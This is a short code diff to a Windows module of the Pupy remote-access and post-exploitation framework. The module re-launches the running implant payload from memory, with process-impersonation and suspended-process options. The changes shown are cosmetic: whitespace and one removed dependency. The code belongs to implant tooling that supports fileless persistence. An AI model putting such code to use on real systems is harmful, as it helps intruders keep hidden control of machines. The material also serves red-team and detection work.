@@ -12,11 +12,11 @@ __class_name__="MemoryDuplicate"
 
 @config(compatibilities=["windows"], category="manage")
 class MemoryDuplicate(PupyModule):
-    """ 
+    """
         Duplicate the current pupy payload by executing it from memory
     """
     interactive=1
-    dependencies=["psutil", "pupwinutils.processes"]
+    dependencies=["pupwinutils.processes"]
     def __init__(self, *args, **kwargs):
         PupyModule.__init__(self,*args, **kwargs)
     def init_argparse(self):
@@ -36,4 +36,3 @@ class MemoryDuplicate(PupyModule):
         self.success("Executing the payload from memory ...")
         exec_pe(self, "", raw_pe=raw_pe, interactive=False, fork=True, timeout=None, use_impersonation=args.impersonate, suspended_process=args.process)
         self.success("pupy payload executed from memory")
-
